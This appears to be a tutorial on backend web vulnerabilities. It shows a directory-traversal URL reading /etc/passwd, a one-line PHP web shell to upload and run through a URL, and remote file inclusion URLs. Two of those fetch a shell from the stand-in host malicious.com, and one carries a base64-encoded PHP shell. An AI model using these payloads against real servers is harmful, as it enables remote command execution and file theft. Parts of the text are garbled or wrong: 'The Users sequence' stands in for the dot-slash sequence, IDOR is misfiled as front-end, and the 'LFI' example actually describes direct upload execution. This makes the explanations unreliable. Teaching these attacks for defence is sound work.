# Backend Component Vulnerabilities

## Differentiate Between Front-End and Back-End Component Vulnerabilities

### Front-End Vulnerabilities

Front-end vulnerabilities are security issues that occur in the client-side components of a web application. These vulnerabilities can be exploited by manipulating the user interface or the data sent to the server.

- **Examples**:
  - Cross-Site Scripting (XSS)
  - Cross-Site Request Forgery (CSRF)
  - Insecure Direct Object References (IDOR)

### Back-End Vulnerabilities

Back-end vulnerabilities are security issues that occur in the server-side components of a web application. These vulnerabilities can be exploited by manipulating the server's logic, database, or file system.

- **Examples**:
  - SQL Injection
  - Directory Traversal
  - Remote File Inclusion (RFI)
  - Local File Inclusion (LFI)

## View Confidential Files with a Directory Traversal Attack by Using the Dot-Slash Method

Directory traversal attacks exploit vulnerabilities in a web application's file handling mechanisms to access files and directories outside the intended directory.

### Example

- **Vulnerable URL**:
  ```http
  http://example.com/view?file=report.txt
  ```

- **Malicious URL**:
  ```http
  http://example.com/view?file=../../../../etc/passwd
  ```

- **Explanation**: The Users sequence traverses up the directory structure to access the passwd file.

## Exploit a Web Application's File Upload Functionality to Conduct a Local File Inclusion Attack

Local File Inclusion (LFI) attacks exploit vulnerabilities in a web application's file handling mechanisms to include files from the local server.

### Example

- **Vulnerable File Upload**:
  ```html
  <form action="/upload" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <button type="submit">Upload</button>
  </form>
  ```

- **Malicious File**: `shell.php`
  ```php
  <?php echo shell_exec($_GET['cmd']); ?>
  ```

- **Upload the Malicious File** and access it:
  ```http
  http://example.com/uploads/shell.php?cmd=ls
  ```

- **Explanation**: The uploaded PHP file allows the attacker to execute arbitrary commands on the server.

## Modify a Web Application's URL to Use a Malicious Remote Script to Conduct Three Different Remote File Inclusion Attacks

Remote File Inclusion (RFI) attacks exploit vulnerabilities in a web application's file handling mechanisms to include files from a remote server.

### Example 1: Basic FIR

- **Vulnerable URL**:
  ```http
  http://example.com/view?file=report.txt
  ```

- **Malicious URL**:
  ```http
  http://example.com/view?file=http://malicious.com/shell.txt
  ```

- **Explanation**: The remote file `shell.txt` is included and executed by the web application.

### Example 2: RFI with Query Parameters

- **Vulnerable URL**:
  ```http
  http://example.com/view?file=report.txt
  ```

- **Malicious URL**:
  ```http
  http://example.com/view?file=http://malicious.com/shell.txt?cmd=ls
  ```

- **Explanation**: The remote file `shell.txt` is included and executed with the query parameter `cmd=ls`.

### Example 3: RFI with Base64 Encoding

- **Vulnerable URL**:
  ```http
  http://example.com/view?file=report.txt
  ```

- **Malicious URL**:
  ```http
  http://example.com/view?file=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUW2NtZF0pOyA/Pg==
  ```

- **Explanation**: The Base64-encoded PHP code is included and executed by the web application.

By understanding and applying these techniques, you can identify and mitigate backend component vulnerabilities, ensuring the security and integrity of your web applications.
